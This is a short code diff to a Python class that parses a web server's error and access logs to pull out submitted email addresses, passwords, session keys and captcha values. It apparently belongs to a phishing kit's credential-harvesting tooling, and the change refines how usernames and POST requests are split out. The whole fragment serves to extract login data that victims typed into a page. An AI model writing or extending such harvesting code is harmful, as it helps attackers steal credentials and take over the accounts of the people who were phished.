@@ -25,8 +25,11 @@ class dns_result :
           with open(Path_St+'/ServerLog/log_error.log') as Log_Handel :
               Log_read = Log_Handel.readlines()
           for line in Log_read:     
-              if '%40'in  line  :            
-                line       = line.split('&')
+              if '%40'in  line  : 
+                if "username" in line :
+                   line = line.split('=')
+                else:
+                     line       = line.split('&')  
                 line_split = str(line[1:3]).split('+&password')
                 line_cread = str("".join(line_split)).replace('+&password',' ').replace('&captcha_text',' ')\
                 .replace("+&session_password=1",'').replace("&session_key ",'').replace('session_key=','')\
@@ -46,7 +49,7 @@ class dns_result :
                 with open(Path_St+'/ServerLog/log_access.log','r') as accesslog:
                         accesslog = accesslog.readlines()#[-243:]
                 for line1 in accesslog:    
-                      if "GET" in line1 or "POST" in line1:
+                      if "POST" in line1:
                           self.domain_web = str(re.findall('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', line1 ))\
                           .replace("[('', '",'').replace("')]",'').replace("', '.",'.').replace('[]','').replace('\n','')
                           if self.domain_web not in  list_web:
